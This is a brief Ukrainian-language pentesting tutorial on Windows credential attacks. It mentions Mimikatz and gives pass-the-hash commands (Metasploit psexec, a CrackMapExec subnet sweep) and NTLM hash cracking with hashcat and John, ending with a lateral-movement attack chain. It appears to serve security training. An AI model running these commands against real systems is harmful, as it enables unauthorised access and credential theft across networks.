Mimikatz (Benjamin Delpy) — найпотужніший інструмент для вилучення Windows credentials. Доступний у Meterpreter як розширення Kiwi. Потрібні SYSTEM привілеї.

Pass-the-Hash та крекінг

Pass-the-Hash (PtH)

Автентифікація хешем без знання пароля через NTLM:

# Metasploit PsExec msf6> use exploit/windows/ smb/psexec msf6> set SMBUser Admin msf6> set SMBPass aad3b...: e02bc503... msf6> exploit # CrackMapExec $ crackmapexec smb 10.0.0.0/24 -u Admin -H e02bc503...

Крекінг хешів

Офлайн-відновлення паролів з хешів:

# Hashcat (GPU) hashcat -m 1000 ntlm_hashes.txt rockyou.txt # John the Ripper john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt # Онлайн lookup # crackstation.net
Ланцюжок: Отримати хеші → Спробувати PtH для латерального руху → Якщо потрібен plaintext → Крекінг через hashcat/john → Повторити на інших системах.
